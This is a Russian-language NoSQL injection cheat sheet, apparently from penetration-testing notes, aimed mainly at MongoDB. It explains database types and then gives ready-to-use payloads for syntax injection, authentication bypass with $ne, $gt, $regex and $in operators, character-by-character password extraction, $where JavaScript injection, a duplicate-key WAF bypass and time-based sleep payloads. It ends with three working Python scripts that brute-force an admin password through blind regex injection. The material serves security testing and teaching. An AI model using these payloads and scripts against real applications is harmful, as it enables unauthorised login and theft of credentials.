> Базы данных NoSQL обеспечивают более слабые ограничения согласованности по сравнению с традиционными реляционными базами данных SQL. Требуя меньше реляционных ограничений и проверок целостности, NoSQL-базы данных часто предлагают преимущества в производительности и масштабируемости. Тем не менее, эти базы данных по-прежнему потенциально уязвимы для атак с инъекциями, даже если они не используют традиционный синтаксис SQL.

* [База про базы](#База-про-базы)
* [Инструменты](#Инструменты)
* [Синтаксическая NoSQL-инъекция](#Синтаксическая-NoSQL-инъекция)
   * [Обнаружение синтаксической инъекции в MongoDB](#Обнаружение-синтаксической-инъекции-в-MongoDB)
   * [Эксплуатация синтаксической инъекции для извлечения данных](#Эксплуатация-синтаксической-инъекции-для-извлечения-данных)
   * [Идентификация имен полей](#Идентификация-имен-полей)
* [Инъекция операторов](#Инъекция-операторов)
   * [Обход аутентификации](#Обход-аутентификации)
   * [Извлечение информации о длине](#Извлечение-информации-о-длине)
   * [Извлечение информации о данных](#Извлечение-информации-о-данных)
   * [Внедрение операторов](#Внедрение-операторов)
* [Обход WAF и фильтров](#Обход-WAF-и-фильтров)
* [Инъекция на основе времени](#Инъекция-на-основе-времени) 
* [Слепые NoSQL-инъекции](#Слепые-NoSQL-инъекции)
   * [POST with JSON Body](#POST-with-JSON-Body)
   * [POST with urlencoded Body](#POST-with-urlencoded-Body)
   * [GET](#GET) 
* [URL](#URL)

# База про базы

**Некоторые распространенные типы NoSQL-баз данных:**

* **Документные хранилища** — хранят данные в гибких, полуструктурированных документах. Обычно используют форматы JSON, BSON или XML и запрашиваются через API или язык запросов. Примеры: MongoDB и Couchbase.
* **Хранилища «ключ-значение»** — хранят данные в формате «ключ-значение». Каждое поле данных связано с уникальной строкой-ключом. Значения извлекаются по этому уникальному ключу. Примеры: Redis и Amazon DynamoDB.
* **Ширококолоночные хранилища** — организуют связанные данные в гибкие семейства столбцов, а не в традиционные строки. Примеры: Apache Cassandra и Apache HBase.
* **Графовые базы данных** — используют узлы для хранения сущностей данных и ребра для хранения отношений между ними. Примеры: Neo4j и Amazon Neptune.
_____________________
**Существует два основных типа NoSQL-инъекций:**

1.  **Синтаксическая инъекция** — возникает, когда можно нарушить синтаксис NoSQL-запроса, что позволяет внедрить собственный вредоносный код. Методология схожа с SQL-инъекцией. Однако характер атаки значительно отличается, так как NoSQL-базы используют множество языков запросов, типов синтаксиса и различных структур данных.
2.  **Инъекция операторов** — возникает, когда можно использовать операторы NoSQL-запросов для манипуляции запросами.
____________________

# Инструменты

*   [codingo/NoSQLmap](https://github.com/codingo/NoSQLMap) — автоматизированный инструмент для перечисления NoSQL-баз данных и эксплуатации веб-приложений.
*   [digininja/nosqlilab](https://github.com/digininja/nosqlilab) — лабораторная среда для экспериментов с NoSQL-инъекциями.
*   [matrix/Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner) — расширение для Burp Suite, позволяющее обнаруживать уязвимости NoSQL-инъекций.

# Синтаксическая NoSQL-инъекция

## Обнаружение синтаксической инъекции в MongoDB

```
", ', `, \, {, }, ;, &
this.category == '''
this.category == '\''
```

**Подтверждение условного поведения**

 `' && 0 && 'x` и `' && 1 && 'x`

## Эксплуатация синтаксической инъекции для извлечения данных

> Во многих NoSQL-базах данных некоторые операторы запросов или функции могут выполнять ограниченный код JavaScript, например оператор `$where` и функция `mapReduce()` в MongoDB.

```json
administrator' && this.password.length < 30 || 'a'=='b
administrator' && this.password[§0§]=='§a§
```
> Также можно использовать функцию JavaScript `match()` для извлечения информации.

Содержит ли пароль цифры:
```
admin' && this.password.match(/\d/) || 'a'=='b
```

## Идентификация имен полей

Отправь полезную нагрузку снова для существующего поля и для поля, которое не существует:
```javascript
admin' && this.username!='
admin' && this.foo!='
```
Если поле `password` существует, ответ будет идентичен ответу для существующего поля (`username`), но отличаться от ответа для несуществующего поля (`foo`).

*Примечание:* В качестве альтернативы можно использовать NoSQL-инъекцию операторов для извлечения имен полей посимвольно. Это позволяет идентифицировать имена полей без необходимости угадывать или выполнять атаку по словарю.

# Инъекция операторов

| Оператор | Описание                      |
| :------- | :---------------------------- |
| `$ne`    | не равные указанному значению |
| `$regex` | регулярное выражение          |
| `$gt`    | больше чем                    |
| `$lt`    | меньше чем                    |
|`$in` | выбирает все значения, указанные в массиве|
| `$nin`   | не входит в массив (not in) |
|`$where` | выбирает документы, удовлетворяющие JavaScript-выражению|


**Пример:** Веб-приложение имеет функцию поиска товаров.

```javascript
db.products.find({ "price": userInput })
```

Пользователь может внедрить NoSQL-запрос: `{ "$gt": 0 }`.

```javascript
db.products.find({ "price": { "$gt": 0 } })
```

Вместо возврата конкретного товара база данных вернет все товары с ценой больше нуля, что приведет к утечке данных.

## Обход аутентификации

Базовый обход аутентификации с использованием операторов "не равно" (`$ne`) или "больше" (`$gt`).

**Данные HTTP (формат `application/x-www-form-urlencoded`):**
```json
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
```

**Данные JSON:**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
{"username":{"$regex":"admi.*"},"password":{"$ne":""}}
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

## Извлечение информации о длине

Внедрите полезную нагрузку, используя оператор `$regex`. Инъекция сработает, если длина будет указана правильно.

```json
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

## Извлечение информации о данных

**Извлечение данных с помощью оператора запроса `$regex`.**

*   **Данные HTTP:**
```json
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp
username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*
```

*   **Данные JSON:**
```json
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```

**Извлечение данных с помощью оператора запроса `$in`.**
```json
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

**Извлечение данных с использованием операторов `$regex`**
```
{"username":"admin","password":{"$regex":"^.*"}}
```
Если ответ на этот запрос отличается от того, который вы получаете при отправке неверного пароля, можно использовать оператор `$regex` для извлечения данных посимвольно. 

* Начинается ли пароль с `a`:
```
{"username":"admin","password":{"$regex":"^a*"}}
```

## Внедрение операторов

```json
{"username":"adminr","password":"123", "$where":"0"}
{"username":"adminr","password":"123", "$where":"1"}
```
* **Извлечение имен полей**

> Если внедрил оператор, позволяющий запускать JavaScript, можно использовать метод `keys()` для извлечения имени полей данных. Например, можно отправить следующую полезную нагрузку:
```
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```
Это проверяет первое поле данных в объекте пользователя и возвращает первый символ имени поля. Это позволяет извлечь имя поля посимвольно.


# Обход WAF и фильтров

**Удаление предварительного условия:**

В MongoDB, если документ содержит дублирующиеся ключи, только последнее вхождение ключа будет иметь приоритет.
```json
{"id":"10", "id":"100"}
```
В этом случае окончательным значением "id" будет "100". Это можно использовать для обхода фильтров или WAF, которые проверяют только первое значение ключа.

# Инъекция на основе времени

1.  Загрузите страницу несколько раз, чтобы определить базовое время загрузки.
2.  Вставьте полезную нагрузку, основанную на времени, во входные данные. Она вызывает намеренную задержку в ответе при выполнении. Например, `{"$where": "sleep(5000)"}` вызывает намеренную задержку в 5000 мс при успешной инъекции.
3.  Если ответ загружается медленнее. Это указывает на успешную инъекцию.

* Если пароль начинается с буквы `a`:
```
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'

admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

# Слепые NoSQL-инъекции

## POST with JSON Body
```python
Python script:

import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
```

## POST with urlencoded Body

```python
Python script:

import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','$']:
            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
                print("Found one more char : %s" % (password+c))
                password += c
```

## GET

```python
Python script:

import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload=f"?username={username}&password[$regex]=^{password + c}"
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print(f"Found one more char : {password+c}")
        password += c
```
# URL
*   [OWASP Testing Guide: Testing for NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
*   [NoSQL Injection in MongoDB](https://www.mongodb.com/docs/manual/faq/fundamentals/#how-does-mongodb-address-sql-or-query-injection-)
*   [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
